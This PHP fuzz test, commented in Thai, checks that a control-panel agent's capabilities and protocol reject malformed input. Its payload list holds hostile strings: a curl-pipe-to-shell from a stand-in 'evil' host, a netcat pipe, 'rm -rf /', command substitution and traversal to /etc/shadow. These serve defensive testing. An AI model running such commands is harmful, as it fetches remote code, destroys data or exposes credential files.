<?php

declare(strict_types=1);

/**
 * ยิงค่าผิดรูปแบบเข้า capability ทุกตัว — SECURITY §6
 *
 * เกณฑ์: ต้อง "ปฏิเสธ" ด้วย ValidationError เท่านั้น
 * ห้ามระเบิดเป็น TypeError หรือ Error ซึ่งแปลว่าค่าหลุดผ่าน validate() เข้าไปถึงโค้ดข้างใน
 *
 * รันในโหมด dryrun — ไม่แตะระบบจริง จึงใส่ใน CI ที่ไม่มีสิทธิ์ root ได้
 */

use Phpcp\Agent\Actor;
use Phpcp\Agent\CapabilityRegistry;
use Phpcp\Agent\ValidationError;
use Phpcp\Security\Permissions;

group('CapabilityFuzz — ค่าผิดรูปแบบต้องถูกปฏิเสธที่ validate()');

/** ค่าที่ผู้โจมตีมักลองยิงเข้ามา */
function fuzzPayloads(): array
{
    return [
        'command injection (;)' => 'apache2; curl http://evil/x.sh | sh',
        'command injection (&&)' => 'apache2 && rm -rf /',
        'command substitution' => '$(id)',
        'backtick' => '`id`',
        'pipe' => 'apache2 | nc evil 4444',
        'newline injection' => "apache2\nrm -rf /",
        'null byte' => "apache2\0.service",
        'path traversal' => '../../etc/passwd',
        'absolute path' => '/etc/shadow',
        'สตริงว่าง' => '',
        'ช่องว่างล้วน' => '   ',
        'ยาวเกินกำหนด' => str_repeat('a', 5000),
        'unicode ซ่อน' => "apache2\u{202E}gnis.exe",
        'HTML/XSS' => '<script>alert(1)</script>',
        'SQL' => "apache2' OR '1'='1",
    ];
}

$registry = new CapabilityRegistry();
$admin = new Actor(1, 'tester', Permissions::SUPERADMIN, '127.0.0.1', 'fuzz');

foreach ($registry->names() as $capabilityName) {
    $capability = $registry->resolve($capabilityName);

    test("{$capabilityName} — ปฏิเสธค่าผิดรูปแบบทุกแบบ", static function () use ($capability): void {
        foreach (fuzzPayloads() as $label => $payload) {
            // ลองทั้งแบบส่งเป็นค่าเดี่ยวและแบบส่งเป็นรายการ ครอบคลุมทั้งสอง schema
            foreach ([['services' => [$payload]], ['service' => $payload], ['path' => $payload]] as $args) {
                try {
                    $clean = $capability->validate($args);
                } catch (\Phpcp\Agent\AgentException) {
                    continue;   // ปฏิเสธแล้ว = ถูกต้อง
                } catch (\Throwable $e) {
                    throw new RuntimeException(
                        "{$label}: ระเบิดเป็น " . $e::class . ' แทนที่จะปฏิเสธอย่างสุภาพ — ' . $e->getMessage(),
                    );
                }

                // ถ้าไม่ปฏิเสธ ค่าที่ผ่านออกมาต้องไม่มีร่องรอยของ payload หลงเหลือ
                $flat = json_encode($clean, JSON_UNESCAPED_UNICODE) ?: '';
                if ($payload !== '' && trim($payload) !== '' && str_contains($flat, $payload)) {
                    throw new RuntimeException("{$label}: ค่าดิบหลุดผ่าน validate() เข้าไปได้");
                }
            }
        }

        TestRunner::$assertions++;
    });
}

test('ทะเบียนปฏิเสธ capability ที่ไม่มีอยู่จริง', static function () use ($registry): void {
    foreach (['service.destroy', 'shell.exec', '../../evil', 'system.metrics.extra', ''] as $name) {
        assertRejects(
            \Phpcp\Agent\UnknownCapability::class,
            static fn () => $registry->resolve($name),
            "ต้องปฏิเสธ capability ที่ไม่มีในทะเบียน: {$name}",
        );
    }
});

test('capability ทุกตัวประกาศ permission และคำอธิบายครบ', static function () use ($registry): void {
    foreach ($registry->names() as $name) {
        $capability = $registry->resolve($name);

        assertTrue($capability->permission() !== '', "{$name} ต้องระบุ permission");
        assertTrue(
            array_key_exists($capability->permission(), Permissions::all()),
            "{$name} อ้าง permission ที่ไม่มีอยู่จริง: " . $capability->permission(),
        );
        assertTrue($capability->summary() !== '', "{$name} ต้องมีคำอธิบายสำหรับ audit log");
    }
});

test('ชื่อ capability ทุกตัวต้องผ่านด่านตรวจของ Protocol ได้จริง', static function () use ($registry): void {
    // **เคยหลุดไปแล้ว:** capability ที่ตั้งชื่อว่า `db.account.credentials` (จุดสองตัว)
    // ลงทะเบียนได้ ทดสอบผ่าน แต่เรียกผ่าน socket จริงไม่ได้เลย เพราะ Protocol ตรวจชื่อ
    // ด้วย regex ที่ยอมให้มีจุดเดียว — ไปเจอเอาตอนกดปุ่มบนเครื่องจริง
    //
    // ทะเบียนกับ Protocol ต้องเห็นตรงกันเสมอ ไม่งั้น capability จะมีอยู่แต่เรียกไม่ได้
    $pattern = '/^[a-z][a-z0-9_]*\\.[a-z][a-z0-9_]*$/';

    foreach ($registry->names() as $name) {
        assertTrue(
            preg_match($pattern, $name) === 1,
            "ชื่อ {$name} ไม่ผ่านด่านตรวจของ Protocol — ลงทะเบียนได้แต่เรียกผ่าน socket ไม่ได้",
        );
    }

    // และรูปแบบที่ใช้ตรวจต้องเป็นตัวเดียวกับที่ Protocol ใช้จริง ไม่ใช่สำเนาที่ค่อย ๆ เพี้ยน
    assertTrue(
        str_contains((string) file_get_contents(PHPCP_ROOT.'/src/Agent/Protocol.php'), $pattern),
        'รูปแบบชื่อในเทสต์ต้องตรงกับที่ Protocol ใช้จริง — ถ้าฝั่งใดเปลี่ยนต้องรู้ตัวทันที',
    );
});

test('protocol ปฏิเสธข้อความที่ผิดรูปแบบ', static function (): void {
    $bad = [
        'ไม่ใช่ JSON' => 'สวัสดี',
        'JSON แต่ไม่ใช่ object' => '"abc"',
        'ไม่มีเวอร์ชัน' => '{"cap":"system.metrics"}',
        'เวอร์ชันผิด' => '{"v":99,"cap":"system.metrics","args":{},"actor":{"role":"superadmin"}}',
        'ไม่มี cap' => '{"v":1,"args":{},"actor":{"role":"superadmin"}}',
        'cap ผิดรูปแบบ' => '{"v":1,"cap":"../evil","args":{},"actor":{"role":"superadmin"}}',
        'role ไม่มีจริง' => '{"v":1,"cap":"system.metrics","args":{},"actor":{"role":"root"}}',
        'ข้อความว่าง' => '',
    ];

    foreach ($bad as $label => $line) {
        assertRejects(
            \Phpcp\Agent\AgentException::class,
            static fn () => \Phpcp\Agent\Protocol::decodeRequest($line),
            "protocol ต้องปฏิเสธ: {$label}",
        );
    }
});
